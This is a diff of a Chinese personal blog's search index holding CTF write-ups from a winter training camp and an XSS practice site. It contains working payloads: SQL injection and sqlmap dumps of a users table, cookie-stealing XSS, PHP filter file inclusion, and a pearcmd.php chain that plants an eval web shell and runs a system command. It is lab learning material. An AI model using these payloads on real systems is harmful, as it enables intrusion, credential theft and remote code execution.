-<li><p>返回了“用户：information_schema,mysql,performance_schema,test,ez_sql 欢迎登录！”其中ez_sql是当前数据库。</p>
-</li>
-<li><p>输入<code>&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;ez_sql&#39; #</code>获得数据库ez_sql下的所有表名称</p>
-</li>
-</ol>
-<blockquote>
-<p>TABLE_NAME表示所属的表的名称；<br>TABLE_SCHEMA表示表所属的数据库名称；<br>information_schema.tables 是MySQL中的一个系统表，它包含了数据库中所有表的信息。它主要用于查询数据库中的表和表的属性，如表名，表的列名，表的类型等。</p>
-</blockquote>
-<ol start="10">
-<li><p>返回了“用户：users 欢迎登录！”</p>
-</li>
-<li><p>输入<code>&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; #</code>获取users表里的所有字段</p>
-</li>
-</ol>
-<blockquote>
-<p>COLUMN_NAME表示字段名；<br>information_schema.columns是MySQL中的一个系统表，它包含了数据库中所有表的列信息，包括列名、数据类型、是否可为空等等。</p>
-</blockquote>
-<ol start="12">
-<li><p>返回了“用户：USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password 欢迎登录！”</p>
-</li>
-<li><p>输入<code>&#39; union select 1,group_concat(concat_ws(&#39;:&#39;,id,username,password)),3 from ez_sql.users #</code>获取字段值</p>
-</li>
-</ol>
-<blockquote>
-<p>concat_ws()函数是MySQL中的一个字符串函数，它可以将多个字符串合并为一个字符串，并且可以在每个字符串之间添加一个分隔符。例如：concat_ws(‘,’,’hello’,’world’)将返回字符串’hello,world’。</p>
-</blockquote>
-<ol start="14">
-<li>返回了“用户：1:why:why,2:nobody:nobody,3:does:does,4:misc:misc,5:im:im,6:so:so,7:sad:sad,8:admin:ROIS{*****} 欢迎登录！”</li>
-</ol>
-<h3 id="Week2-double-cmd-amp-amp-Week2-double-cmd-plus"><a href="#Week2-double-cmd-amp-amp-Week2-double-cmd-plus" class="headerlink" title="[Week2]double_cmd &amp;&amp;[Week2]double_cmd_plus"></a>[Week2]double_cmd &amp;&amp;[Week2]double_cmd_plus</h3><p>没做出来</p>
-<p>思路：<br>易得，该段代码会接收来自网页表单的参数cmd，并将其作为文件路径，然后进行包含。但是在包含之前，会将参数中的”flag”字符串替换为空字符。<br>与我之前看到的文件包含题不同（主要是我没见识），这玩意儿是POST传参的。<br>我尝试了<code>cmd=flflagag</code>绕过，虽然输出了flag但是不知道下一步该怎么做，然后就卡在这里了。</p>
-<p>春节期间比我想得要忙，也没做几道题，只能写点浅显的东西勉勉强强这样子。。。</p>
-<h4 id="2023-x2F-01-x2F-26-学习-amp-amp-尝试-1"><a href="#2023-x2F-01-x2F-26-学习-amp-amp-尝试-1" class="headerlink" title="2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试</h4><p><strong>[Week2]double_cmd</strong></p>
-<ol>
-<li><code>cmd=flflagag</code>双写绕过</li>
-</ol>
-<blockquote>
-<p>没有结果是因为<code>include($cmd)</code>中cmd&#x3D;flag的flag是在网站目录的，而网站目录会显示404，说明flag应该是在根目录情况下</p>
-</blockquote>
-<ol start="2">
-<li><code>cmd=/flflagag</code>绝对路径看看,但是无事发生</li>
-</ol>
-<blockquote>
-<p>绝对路径是指文件或文件夹在计算机系统中的完整路径，它包括所有父文件夹的名称，以及最后的文件或文件夹的名称</p>
-</blockquote>
-<ol start="3">
-<li>由题意得，可以用PHP伪协议绕过<code>cmd=php://filter/convert.base64-encode/resource=/flaflagg</code></li>
-</ol>
-<blockquote>
-<p>PHP伪协议是一种用于从服务器获取文件的协议，它允许用户以URL的形式从服务器中读取文件，而无需使用FTP或其他文件传输协议。PHP伪协议使用“php:&#x2F;&#x2F;”作为URL的前缀，以便能够识别它。<br><code>?file=php://filter/convert.base64-encode/resource=index.php</code><br>php:&#x2F;&#x2F;filter&#x2F;是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F;表示读取的方式是base64编码，resource&#x3D;index.php表示目标文件为index.php。</p>
-</blockquote>
-<h4 id="2023-x2F-01-x2F-27-学习-amp-amp-尝试-2"><a href="#2023-x2F-01-x2F-27-学习-amp-amp-尝试-2" class="headerlink" title="2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试</h4><p><strong>[Week2]double_cmd_plus</strong><br>等等。。还在捋。。。。。。。。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?+config-create+/&amp;/&lt;?=eval($_POST[123])?&gt;+/tmp/hello.php HTTP/1.1</span><br><span class="line">cmd=flaflagg/../../../../../../../../../../../../usr/local/lib/php/pearcmd.php</span><br><span class="line"></span><br><span class="line">http://101.43.57.52:28084/index.php</span><br><span class="line">cmd=flflagag/../../../../../../../../../../../../tmp/hello.php&amp;123=system(&quot;/readflag&quot;);</span><br></pre></td></tr></table></figure>
-<p>按视频做法走了一遍大概是这样。。。让我捋捋。。让我捋捋。。。。。。。</p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Week2-八重神子的尾巴"><a href="#Week2-八重神子的尾巴" class="headerlink" title="[Week2]八重神子的尾巴"></a>[Week2]八重神子的尾巴</h3><p>Winhex，最后面，flag</p>
-<h3 id="Week2-扫雷"><a href="#Week2-扫雷" class="headerlink" title="[Week2]扫雷"></a>[Week2]扫雷</h3><p>我不知道预期解法是什么样的，反正我老老实实扫了两小时雷，扫完出来看得出来是张二维码，但是扫不出来；然后电脑找个画像素画的网站，一格一格涂出来，然后，扫。</p>
-<h3 id="Week2-爱门！"><a href="#Week2-爱门！" class="headerlink" title="[Week2]爱门！"></a>[Week2]爱门！</h3><p>由题意得，是PNG图片格式隐写，把图片高度改高即可。<br>Winhex打开</p>
-<blockquote>
-<p><strong>00-07</strong> 89 50 4E 47 0D 0A 1A 0A 固定<br><strong>08-0B</strong> 标识IHDR区的大小<br><strong>0C-0F</strong> 49 48 44 52 固定（IHDR区）<br><strong>10-13</strong> 图片宽度<br><strong>14-17</strong> 图片高度（本题就是改这里改大就好</p>
-</blockquote>
-<h3 id="Week2-真的加密了吗？"><a href="#Week2-真的加密了吗？" class="headerlink" title="[Week2]真的加密了吗？"></a>[Week2]真的加密了吗？</h3><p>伪加密，09改回00即可。<br>Winhex打开</p>
-<blockquote>
-<p><strong>压缩源文件数据区：</strong><br>50 4B 03 04 头文件标记<br>14 00 解压文件所需 pkware 版本<br>00 00 全局加密（改这里</p>
-</blockquote>
-<blockquote>
-<p><strong>压缩源文件目录区：</strong><br>50 4B 01 02 目录中文件文件头标记<br>3F 00 压缩使用的 pkware 版本<br>14 00 解压文件所需 pkware 版本<br>00 00 全局方式位标记（还有这里<br>↑↑↑↑↑↑↑↑改这个会显示是否有密码</p>
-</blockquote>
-<blockquote>
-<p><strong>压缩源文件目录结束标志：</strong><br>50 4B 05 06 目录结束标记 </p>
-</blockquote>
-<h3 id="Week2-guess"><a href="#Week2-guess" class="headerlink" title="[Week2]guess"></a>[Week2]guess</h3><p>我觉得根据题意显然是爆破，但是。。。。我爆破了三天，用了各种组合（belike：6位内所有字符；8位内大小写字母，7位内大小写字母加数字，10位数字等等等等等等等）出来了三个密码，输进去打开文件全是乱码，第四天电脑趁我挂机偷偷更新，重启打开都不知道爆破到哪里去了，遂作罢。</p>
-<p>（2023年1月25日22点23分：吗吖怎么真靠猜啊。。第一排字母。。确实是很简单。。理是这个理没错。。但是。。但是。。好吧是弱密码爆破倒也没错。。。。。。<br>（2023年1月25日22点26分：说起来我怎么没想到用十位小写字母爆破一下，没准爆个两天也爆出来了呢（在口嗨</p>
-<h3 id="Week2-透视"><a href="#Week2-透视" class="headerlink" title="[Week2]透视?"></a>[Week2]透视?</h3><p>打开压缩包发现5个TXT文件大小分别为16，15，18，16，17字节刚好满足crc32暴破的条件（小于等于18）。<br>遂采用crc32爆破</p>
-<p>很不巧本人还不会用python写脚本爆破，上网找了个CRC32爆破工具<br><a href="https://github.com/theonlypwner/crc32">https://github.com/theonlypwner/crc32</a><br>使用方法：<code>python crc32.py reverse 0x（crc32密文）</code><br>这个工具可以解4字节和6字节的字符串，然而不幸的事情又发生了，这玩意儿里面还有一个3字节和一个5字节，网上找了个别人的代码<br><a href="https://blog.csdn.net/WFC1006848997/article/details/110295708">CRC32碰撞脚本（1-5字节）</a><br>5字节有点慢，不过能凑合着用。</p>
-<p>最后一个个解出来拼在一起，就是flag。</p>
-]]></content>
-      <categories>
-        <category>做题记录</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>web</tag>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xss学习做题wp</title>
-    <url>/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/</url>
-    <content><![CDATA[<p>xss，没学过，不会做，找点题来练练手<br>闯关网址<a href="http://test.xss.tv/">http://test.xss.tv</a></p>
-<span id="more"></span>
-<p>上网看到有个测试神句<code>&lt;script &quot; &#39;Oonn&gt;</code>但是我还不怎么会用</p>
-<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>经典代码<br><code>&lt;script&gt;alert()&lt;/script&gt;</code></p>
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>用用那个什么<code>&lt;script &quot; &#39;Oonn&gt;</code>神句看看<br>搜索框里只出现了<code>&lt;script </code>猜测可以用双引号绕过<br>闭合绕过<br><code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;</code></p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code><br>搜索框里只出现了<code>&lt;script &quot; </code>猜测可以用单引号绕过<br><code>&#39;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&#39;</code><br>左边一个&gt;闭合，右边一个&lt;和末端的&gt;闭合<br>什么单引号也不行？！右键源代码一探究竟<br>看到<code>value=&#39;&amp;lt;script &amp;quot; &#39;Oonn&amp;gt;&#39;</code><br>OMG原来大于小于被转义了！好悲伤的一道题<br>浅浅网上随便找个不用大于小于的<br><code>&#39;onmouseover=&#39;alert()</code>然后点击搜索</p>
-<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code>搜索框里只剩<code>script</code><br>源代码<code>value=&quot;script &quot; &#39;Oonn&quot;</code><br>卡在双引号，大于小于不能用因为被过滤了<br>那不和上一题一样只是单引变双引嘛<br><code>&quot;onmouseover=&quot;alert()</code></p>
-<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code>搜索框里变成<code>&lt;scr_ipt </code><br>源代码<code>value=&quot;&lt;scr_ipt &quot; &#39;oo_nn&gt;&quot;</code>介个似协模意思捏。。<br>首先哈，大于小于没被转义也没被过滤，然后哈，应该是双引号闭合<br>输<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code>源代码是<code>value=&quot;&quot;&gt;&lt;scr_ipt&gt;alert()&lt;/script&gt;&lt;&quot;&quot;</code><br>输<code>&quot;onmouseover=&quot;alert()</code>源代码是<code>value=&quot;&quot;o_nmouseover=&quot;alert()&quot;</code><br>但是试了<code>&lt;a href=&quot;javascript:alert()&quot;&gt;</code>可以发现是可行的<br>构建，先双引号<code>&quot;</code>然后<code>&gt;</code>和左边闭合，然后<code>&lt;a href=&quot;javascript:alert()&quot;&gt;</code>，<code>&lt;</code>和右边闭合<br><code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;&lt;</code>铛铛出炉</p>
-<p>先做到这，明天继续</p>
-]]></content>
-      <categories>
-        <category>做题记录</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -940,6 +433,513 @@
         <tag>web</tag>
         <tag>crypto</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>xss学习做题wp</title>
+    <url>/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/</url>
+    <content><![CDATA[<p>xss，没学过，不会做，找点题来练练手<br>闯关网址<a href="http://test.xss.tv/">http://test.xss.tv</a></p>
+<span id="more"></span>
+<p>上网看到有个测试神句<code>&lt;script &quot; &#39;Oonn&gt;</code>但是我还不怎么会用</p>
+<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>经典代码<br><code>&lt;script&gt;alert()&lt;/script&gt;</code></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>用用那个什么<code>&lt;script &quot; &#39;Oonn&gt;</code>神句看看<br>搜索框里只出现了<code>&lt;script </code>猜测可以用双引号绕过<br>闭合绕过<br><code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;</code></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code><br>搜索框里只出现了<code>&lt;script &quot; </code>猜测可以用单引号绕过<br><code>&#39;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&#39;</code><br>左边一个&gt;闭合，右边一个&lt;和末端的&gt;闭合<br>什么单引号也不行？！右键源代码一探究竟<br>看到<code>value=&#39;&amp;lt;script &amp;quot; &#39;Oonn&amp;gt;&#39;</code><br>OMG原来大于小于被转义了！好悲伤的一道题<br>浅浅网上随便找个不用大于小于的<br><code>&#39;onmouseover=&#39;alert()</code>然后点击搜索</p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code>搜索框里只剩<code>script</code><br>源代码<code>value=&quot;script &quot; &#39;Oonn&quot;</code><br>卡在双引号，大于小于不能用因为被过滤了<br>那不和上一题一样只是单引变双引嘛<br><code>&quot;onmouseover=&quot;alert()</code></p>
+<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code>搜索框里变成<code>&lt;scr_ipt </code><br>源代码<code>value=&quot;&lt;scr_ipt &quot; &#39;oo_nn&gt;&quot;</code>介个似协模意思捏。。<br>首先哈，大于小于没被转义也没被过滤，然后哈，应该是双引号闭合<br>输<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code>源代码是<code>value=&quot;&quot;&gt;&lt;scr_ipt&gt;alert()&lt;/script&gt;&lt;&quot;&quot;</code><br>输<code>&quot;onmouseover=&quot;alert()</code>源代码是<code>value=&quot;&quot;o_nmouseover=&quot;alert()&quot;</code><br>但是试了<code>&lt;a href=&quot;javascript:alert()&quot;&gt;</code>可以发现是可行的<br>构建，先双引号<code>&quot;</code>然后<code>&gt;</code>和左边闭合，然后<code>&lt;a href=&quot;javascript:alert()&quot;&gt;</code>，<code>&lt;</code>和右边闭合<br><code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;&lt;</code>铛铛出炉</p>
+<p>先做到这，明天继续</p>
+]]></content>
+      <categories>
+        <category>做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ROIS冬令营第二周WriteUp</title>
+    <url>/2023/01/25/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%BA%8C%E5%91%A8Write-Up/</url>
+    <content><![CDATA[<p>（1.27更了跟没更似的）ROIS冬令营第二周Write Up</p>
+<span id="more"></span>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Week2-XssTest"><a href="#Week2-XssTest" class="headerlink" title="[Week2]XssTest"></a>[Week2]XssTest</h3><p>这题没做出来</p>
+<p>根据hint1可知：</p>
+<blockquote>
+<p>这是DOM型XSS，其与反射型和存储型的区别是XSS代码的解析，不需要服务器解析响应的直接参与，由浏览器的DOM进行解析。名字也是因此得来。</p>
+</blockquote>
+<blockquote>
+<p>DOM型的XSS漏洞不同于反射型和存储型并不经过后台，只是在前端被dom获取到，通过dom又在前端输出了。</p>
+</blockquote>
+<p>根据hint2：</p>
+<blockquote>
+<ol>
+<li>使用JavaScript的document.cookie函数，将cookie输出到页面上；</li>
+<li>将页面的URL地址发送给bot，让bot去截图；</li>
+<li>截图返回后，从截图中提取cookie信息。</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>cookie是一种存储在用户计算机中的小文件，用于跟踪用户的浏览器会话状态，以便网站能够记住用户的设置，如登录状态、语言和其他参数。</p>
+</blockquote>
+<p>尝试构建语句<code>&lt;script&gt;document.write(document.cookie);&lt;/script&gt;</code>失败<br>还试了些别的，不过都没有成功。。这里就不放了</p>
+<p>在网上搜索同类型题时看到一种做法<br><a href="https://blog.csdn.net/weixin_52116519/article/details/124480558">[ctfhub]-xss详解</a><br>然后也用这种办法尝试了，但是cookie那里没有东西出来，猜测可能人家的题是反射型咱这是DOM型（当然还可能是因为别的不过我还在研究</p>
+<h4 id="2023-x2F-01-x2F-26-学习-amp-amp-尝试"><a href="#2023-x2F-01-x2F-26-学习-amp-amp-尝试" class="headerlink" title="2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试</h4><blockquote>
+<p>使用<code>&lt;script&gt;</code>存在的问题是：页面加载中<code>&lt;script&gt;</code>标签是已经加载过的，通过JavaScript再往页面再写入<code>&lt;script&gt;</code>标签的话，它是不会去执行的。<br><strong>【DOM型XSS和其他XSS的区别之一】</strong></p>
+</blockquote>
+<blockquote>
+<p><code>document.write()</code>可向文档写入文本内容，如果在文档已完成加载后执行 <code>document.write()</code>，整个 HTML 页面将被覆盖。</p>
+</blockquote>
+<p><strong>padload：</strong><br><code>&lt;img src=1 onerror=document.write(document.cookie)&gt;</code><br>。。。吗吖加载了两小时小时终于出来了<br>。。。我不会说我直接图片转文字大写I和小写l全嘎嘎乱出导致我交错了四次但这是事实<br>。。。吗吖我是若汁</p>
+<p>理论上以下几种应该也可以，但是我没成功。。。：<br><code>&lt;img src=document.domain onerror=alert(document.cookie)&gt;</code><br><code>&lt;details open ontoggle=document.write(document.cookie)&gt;</code></p>
+<h3 id="Week2-ez-php-source"><a href="#Week2-ez-php-source" class="headerlink" title="[Week2]ez_php_source"></a>[Week2]ez_php_source</h3><p>用HackBar也能做，不过这里讲BurpSuite</p>
+<p>第一部分：</p>
+<ol>
+<li><code>?b=408</code>；</li>
+<li>改POST；</li>
+<li>加<code>Content-Type: application/x-www-form-urlencoded</code>请求头；</li>
+<li>尾部<code>a=405</code>；</li>
+</ol>
+<p>第二部分：<br>首先了解PHP&#x3D;&#x3D;&#x3D;强弱类型<br><a href="https://blog.csdn.net/m0_56691564/article/details/127380406?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-2-127380406-blog-109427287.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-2-127380406-blog-109427287.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=3">ctf中MD5绕过详细总结及例题[BJDCTF2020]Easy MD5</a><br>然后看得出来这里是强类型，使用数组绕过，用&amp;跟a连在一起<br><code>a=405&amp;c[]=1&amp;d[]=2</code></p>
+<p>第三部分：</p>
+<blockquote>
+<p>GET里的变量全都会自动进行urldecode。<br>POST里的变量只有Content-Type: application&#x2F;x-www-form-urlencoded下会自动进行urldecode。</p>
+</blockquote>
+<p>由题意得：<br><code>$_POST[&#39;last1&#39;]==&#39;TheBestLanguage====PHP&#39;</code>；然后加完密的last1等于解密的last2</p>
+<p>可得last2为last1进行urlencode三次</p>
+<p>以下为全部的数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?b=408&amp;last2=TheBestLanguage%25253D%25253D%25253D%25253DPHP HTTP/1.1</span><br><span class="line">Host: 。。。。</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 46</span><br><span class="line"></span><br><span class="line">a=405&amp;c[]=1&amp;d[]=2&amp;last1=TheBestLanguage====PHP</span><br></pre></td></tr></table></figure>
+<h4 id="2023-x2F-01-x2F-27-学习-amp-amp-尝试"><a href="#2023-x2F-01-x2F-27-学习-amp-amp-尝试" class="headerlink" title="2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试</h4><p>补个Hackbar的。。其实是一样的<br>GET：<code>http://101.43.57.52:28082/?b=408&amp;last2=TheBestLanguage%253D%253D%253D%253DPHP</code><br>POST：<code>a=405&amp;c[]=1&amp;d[]=2&amp;last1=TheBestLanguage====PHP</code></p>
+<h3 id="Week2-very-easy-sql"><a href="#Week2-very-easy-sql" class="headerlink" title="[Week2]very_easy_sql"></a>[Week2]very_easy_sql</h3><p>首先尝试万能密码<code>admin&#39; or 1=1#</code>,出现<code>用户：why 欢迎登录！</code>字样。</p>
+<p>然后。。。。没思路了（目移）。。。用sqlmap做的，这里写一下sqlmap的过程</p>
+<ol>
+<li>bp抓包，发现是POST类型的，设置<code>username=why&amp;password=1</code>并把提交的数据包保存下来，保存为xxx.txt</li>
+<li>在sqlmap里输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot;</code></li>
+<li>然后出来了一个<code>heuristic (basic) test shows that POST parameter &#39;username&#39; might not be injectable</code>和一个<code>heuristic (basic) test shows that POST parameter &#39;password&#39; might not be injectable</code>表明username和password可能是可注入的</li>
+<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -dbs</code>获取所有数据库<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] ez_sql</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br></pre></td></tr></table></figure></li>
+<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -current-db</code>获得当前数据库<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">current database: &#x27;ez_sql&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -D ez_sql --tables</code>获得数据库ez_sql下的所有表<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ez_sql</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure></li>
+<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -D ez_sql -T users --columns</code>获取users表里的所有字段<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ez_sql</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(11)     |</span><br><span class="line">| password | varchar(30) |</span><br><span class="line">| username | varchar(10) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure></li>
+<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -D ez_sql -T users -C id,password,username --dump</code>获取字段值<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ez_sql</span><br><span class="line">Table: users</span><br><span class="line">[8 entries]</span><br><span class="line">+----+-------------+----------+</span><br><span class="line">| id | password    | username |</span><br><span class="line">+----+-------------+----------+</span><br><span class="line">| 1  | why         | why      |</span><br><span class="line">| 2  | nobody      | nobody   |</span><br><span class="line">| 3  | does        | does     |</span><br><span class="line">| 4  | misc        | misc     |</span><br><span class="line">| 5  | im          | im       |</span><br><span class="line">| 6  | so          | so       |</span><br><span class="line">| 7  | sad         | sad      |</span><br><span class="line">| 8  | ROIS&#123;*****&#125; | admin    |</span><br><span class="line">+----+-------------+----------+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>sqlmap使用方法参考：<br><a href="https://blog.csdn.net/weixin_43882862/article/details/119673249">CTF刷题–SQL注入（sqlmap）</a><br><a href="https://blog.csdn.net/songbai220/article/details/109303110">sqlmap使用教程(超详细)</a><br><a href="https://blog.csdn.net/weixin_42529890/article/details/107238671">[网络安全自学篇] 二十七.Sqlmap基础用法、CTF实战及请求参数设置（一）</a></p>
+<h4 id="2023-x2F-01-x2F-27-学习-amp-amp-尝试-1"><a href="#2023-x2F-01-x2F-27-学习-amp-amp-尝试-1" class="headerlink" title="2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试</h4><p>按wp顺序过一遍。。显然我自己是不会做的。。</p>
+<ol>
+<li>测测闭合，这里是单引号闭合</li>
+</ol>
+<blockquote>
+<p>闭合判断是进行手动注入的第一步，判断闭合之后就可以开始注入了。</p>
+</blockquote>
+<ol start="2">
+<li>用<code>order by</code>测测有几个表</li>
+</ol>
+<blockquote>
+<p><code>order by</code>是SQL语句中用来指定查询结果按照某个字段排序的语句。</p>
+</blockquote>
+<ol start="3">
+<li><p><code>&#39; order by 3 #</code>是“不存在或密码错误！”<br><code>&#39; order by 4 #</code>是“啊哦，出错了！”<br>易得，表是三列的。</p>
+</li>
+<li><p>由于页面总会返回输入的username信息，所以可以尝试把信息输出到这里。</p>
+</li>
+</ol>
+<blockquote>
+<p><code>union select</code>是一种 SQL 注入技术，用于查询多个表中的数据。它的工作原理是，将多个查询结果合并成一个结果集，以便攻击者可以从数据库中获取敏感信息。</p>
+</blockquote>
+<ol start="5">
+<li><p>输入<code>&#39; union select 1,2,3 #</code>网页输出“用户：2 欢迎登录！”，所有第二列是可以返回信息的。</p>
+</li>
+<li><p>输入<code>admin&#39; union select 1,2,3 #</code>网页输出“用户：admin 欢迎登录！”没有输出“2”，所以要用group_concat将所有结果放在同一行内。</p>
+</li>
+</ol>
+<blockquote>
+<p>group_concat是MySQL数据库的一个函数，它可以将多行查询结果合并为一行，以逗号分隔各个字段。它可以用来检测SQL注入漏洞，因为它可以将多行查询结果合并为一行，以便检测SQL注入漏洞。</p>
+</blockquote>
+<ol start="7">
+<li>输入<code>admin&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata #</code>获得数据库名称</li>
+</ol>
+<blockquote>
+<p>SCHEMA_NAME，表示数据库名称；<br>information_schema.schemata是MySQL中的一个系统表，它存储了数据库中每个数据库的信息，包括数据库名称、字符集和排序规则等。</p>
+</blockquote>
+<ol start="8">
+<li><p>返回了“用户：information_schema,mysql,performance_schema,test,ez_sql 欢迎登录！”其中ez_sql是当前数据库。</p>
+</li>
+<li><p>输入<code>&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;ez_sql&#39; #</code>获得数据库ez_sql下的所有表名称</p>
+</li>
+</ol>
+<blockquote>
+<p>TABLE_NAME表示所属的表的名称；<br>TABLE_SCHEMA表示表所属的数据库名称；<br>information_schema.tables 是MySQL中的一个系统表，它包含了数据库中所有表的信息。它主要用于查询数据库中的表和表的属性，如表名，表的列名，表的类型等。</p>
+</blockquote>
+<ol start="10">
+<li><p>返回了“用户：users 欢迎登录！”</p>
+</li>
+<li><p>输入<code>&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; #</code>获取users表里的所有字段</p>
+</li>
+</ol>
+<blockquote>
+<p>COLUMN_NAME表示字段名；<br>information_schema.columns是MySQL中的一个系统表，它包含了数据库中所有表的列信息，包括列名、数据类型、是否可为空等等。</p>
+</blockquote>
+<ol start="12">
+<li><p>返回了“用户：USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password 欢迎登录！”</p>
+</li>
+<li><p>输入<code>&#39; union select 1,group_concat(concat_ws(&#39;:&#39;,id,username,password)),3 from ez_sql.users #</code>获取字段值</p>
+</li>
+</ol>
+<blockquote>
+<p>concat_ws()函数是MySQL中的一个字符串函数，它可以将多个字符串合并为一个字符串，并且可以在每个字符串之间添加一个分隔符。例如：concat_ws(‘,’,’hello’,’world’)将返回字符串’hello,world’。</p>
+</blockquote>
+<ol start="14">
+<li>返回了“用户：1:why:why,2:nobody:nobody,3:does:does,4:misc:misc,5:im:im,6:so:so,7:sad:sad,8:admin:ROIS{*****} 欢迎登录！”</li>
+</ol>
+<h3 id="Week2-double-cmd-amp-amp-Week2-double-cmd-plus"><a href="#Week2-double-cmd-amp-amp-Week2-double-cmd-plus" class="headerlink" title="[Week2]double_cmd &amp;&amp;[Week2]double_cmd_plus"></a>[Week2]double_cmd &amp;&amp;[Week2]double_cmd_plus</h3><p>没做出来</p>
+<p>思路：<br>易得，该段代码会接收来自网页表单的参数cmd，并将其作为文件路径，然后进行包含。但是在包含之前，会将参数中的”flag”字符串替换为空字符。<br>与我之前看到的文件包含题不同（主要是我没见识），这玩意儿是POST传参的。<br>我尝试了<code>cmd=flflagag</code>绕过，虽然输出了flag但是不知道下一步该怎么做，然后就卡在这里了。</p>
